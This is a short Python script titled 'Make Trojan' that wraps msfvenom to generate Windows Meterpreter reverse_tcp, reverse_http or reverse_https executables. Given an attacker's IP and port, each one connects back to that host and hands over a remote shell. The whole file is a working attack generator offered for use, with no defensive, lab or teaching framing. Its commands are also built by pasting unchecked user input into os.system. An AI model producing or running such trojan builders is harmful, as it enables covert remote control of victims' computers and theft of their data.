#!/usr/bin/env python


import os
import time
x=0
while x==0:
	os.system("apt-get install figlet")
	os.system("clear")
	print("\033[0;34m")
	os.system("figlet Make Trojan")

	print("""\033[1;33m

	Make Trojan



		""")

	ip = input("Enter LOCAL IP or PUBLIC IP: ")
	port = input("\nEnter the port: ")
	print("""\033[1;34m
	1)windows/meterpreter/reverse_tcp
	2)windows/meterpreter/reverse_http
	3)windows/meterpreter/reverse_https
	\033[1;33m
		""")
	payload = input("Enter the Payload NO: ")
	saveplace = input("\nEnter the save place: ")
	name=input("\nEnter the file name: ")


	if(payload=="1"):
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + saveplace + name + ".exe")
		print("""
			\033[1;32mPayload successfully created...
		""")
		time.sleep(3)
		break
	elif(payload=="2"):
		os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + saveplace + name + ".exe")
		print("""
			\033[1;32mPayload successfully created...
		""")
		time.sleep(3)
		break
	elif(payload=="3"):
		os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o " + saveplace + name + ".exe")
		print("""
			\033[1;32mPayload successfully created...
		""")
		time.sleep(3)
		break
	else:
		print("\033[1;31mYou made the wrong choice.,please wait")
		time.sleep(2)



